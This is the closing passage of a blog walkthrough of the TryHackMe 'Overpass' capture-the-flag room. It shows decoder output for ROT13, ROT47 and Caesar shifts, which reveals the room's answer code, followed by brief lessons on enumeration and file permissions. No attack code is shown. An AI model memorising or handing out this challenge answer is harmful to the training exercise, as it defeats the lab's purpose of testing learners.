<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> ROT13 decoded: ,YD?2&gt;6DvD%PWj24&lt;|<span style=color:#ae81ff>6</span> $S3Q4P:NR:@? e@56D<span style=color:#f92672>[</span>DN2QQDvD8&gt;%fW<span style=color:#f92672>=</span>DA.
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> ROT47 decoded: <span style=color:#f92672>[{</span><span style=color:#e6db74>&#34;name&#34;</span>:<span style=color:#e6db74>&#34;TryHackMe Subscription Code&#34;</span>,<span style=color:#e6db74>&#34;pass&#34;</span>:<span style=color:#e6db74>&#34;gmTDyl&#34;</span><span style=color:#f92672>}]</span>

-------------------------------------------------------

<span style=color:#f92672>[</span>%<span style=color:#f92672>]</span> Ceaser Cipher <span style=color:#f92672>(</span>with shifts <span style=color:#ae81ff>0</span> - 9<span style=color:#f92672>)</span>

<span style=color:#f92672>[</span>&amp;<span style=color:#f92672>]</span> Shift: <span style=color:#ae81ff>0</span> Decoded: ,LQ?2&gt;6QiQ%CJw24&lt;|<span style=color:#ae81ff>6</span> $F3D4C:AE:@? r@56Q<span style=color:#f92672>[</span>QA2DDQiQ8&gt;%sJ<span style=color:#f92672>=</span>QN.
...

-------------------------------------------------------
</code></pre></div><br><p><strong>Code:</strong> <code>gmTDyl</code></p><p>Thanks for reading this walkthrough, hopefully you liked it! üòâ</p><hr><h2 id=todos--things-learnt>Todos ‚Äî Things learnt<a hidden class=anchor aria-hidden=true href=#todos--things-learnt>#</a></h2><ul><li>Always check the source code of .js files</li><li>Don&rsquo;t keep dirsearching and enumerate the found paths already</li><li>Always check for sensitive files permissions</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/tryhackme/>tryhackme</a></li><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/rustscan/>rustscan</a></li><li><a href=https://umar0x01.sh/tags/gobuster/>gobuster</a></li><li><a href=https://umar0x01.sh/tags/go/>go</a></li><li><a href=https://umar0x01.sh/tags/authbypass/>authbypass</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li><li><a href=https://umar0x01.sh/tags/cronjobs/>cronjobs</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/tryhackme-develpy/><span class=title>¬´ Prev Page</span><br><span>TryHackMe - Develpy</span></a>
<a class=next href=https://umar0x01.sh/post/thm-agent_sudo/><span class=title>Next Page ¬ª</span><br><span>TryHackMe - Agent Sudo</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Overpass&url=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f&hashtags=tryhackme%2cssh%2chttp%2crustscan%2cgobuster%2cgo%2cauthbypass%2cprivesc%2ccronjobs"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f&title=TryHackMe%20-%20Overpass&summary=TryHackMe%20-%20Overpass&source=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f&title=TryHackMe%20-%20Overpass"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Overpass%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Overpass on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Overpass&url=https%3a%2f%2fumar0x01.sh%2fpost%2foverpass-tryhackme%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>